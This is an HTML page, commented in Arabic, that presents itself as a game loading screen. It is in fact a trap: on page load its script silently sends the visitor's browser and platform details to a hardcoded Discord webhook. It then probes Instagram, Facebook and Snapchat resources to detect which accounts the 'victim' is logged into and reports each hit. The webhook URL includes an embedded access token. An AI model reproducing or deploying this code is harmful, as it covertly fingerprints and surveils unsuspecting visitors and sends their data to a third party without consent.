<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0;
            overflow: hidden; 
            font-family: sans-serif; 
        }
        .container { text-align: center; }
        .loader { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #3498db; 
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px; 
        }
        /* الرقم الكبير للتأكيد البصري */
        .version-marker {
            font-size: 80px;
            font-weight: bold;
            color: #1a1a1a; /* لون غامق عشان ما يشتت الضحية بس أنت تشوفه */
            position: absolute;
            top: 20px;
            right: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">1</div>

    <div class="container">
        <div class="loader"></div>
        <p style="font-size: 18px;">جاري تحميل محرك اللعبة، يرجى الانتظار...</p>
        <p style="color: #444; font-size: 12px;">Build: 1.1.3-STABLE</p>
    </div>

    <script>
        // المعرف اللي بيوصل للديسكورد
        const BUILD_ID = "Build_1"; 
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        async function sendLog(service, status) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: `🚀 تحديث المصيدة | ${BUILD_ID}`,
                            description: `**الخدمة:** ${service}\n**الحالة:** ${status}`,
                            color: status.includes('✅') ? 3066993 : 15158332,
                            timestamp: new Date().toISOString(),
                            footer: { text: `ID: ${navigator.platform}` }
                        }]
                    })
                });
            } catch (e) {}
        }

        function probeService(name, url) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = () => { sendLog(name, "✅ الضحية مسجل دخول"); resolve(true); };
                img.onerror = () => { resolve(false); }; 
                // منع التخزين المؤقت للصور
                img.src = url + "?cachebuster=" + new Date().getTime();
                setTimeout(() => resolve(false), 5000);
            });
        }

        async function startSilentMission() {
            // إرسال معلومات النظام فور الدخول
            await sendLog("System Discovery", "📱 " + navigator.userAgent);

            // روابط انستا (Static Assets)
            const instaPath = "https://static.cdninstagram.com/rsrc.php/v3/yt/r/30p_n4Y9pB8.png";
            await probeService("Instagram", instaPath);

            // فيسبوك وسناب
            await probeService("Facebook", "https://www.facebook.com/favicon.ico");
            await probeService("Snapchat", "https://www.snapchat.com/favicon.ico");
        }

        window.onload = startSilentMission;
    </script>
</body>
</html>
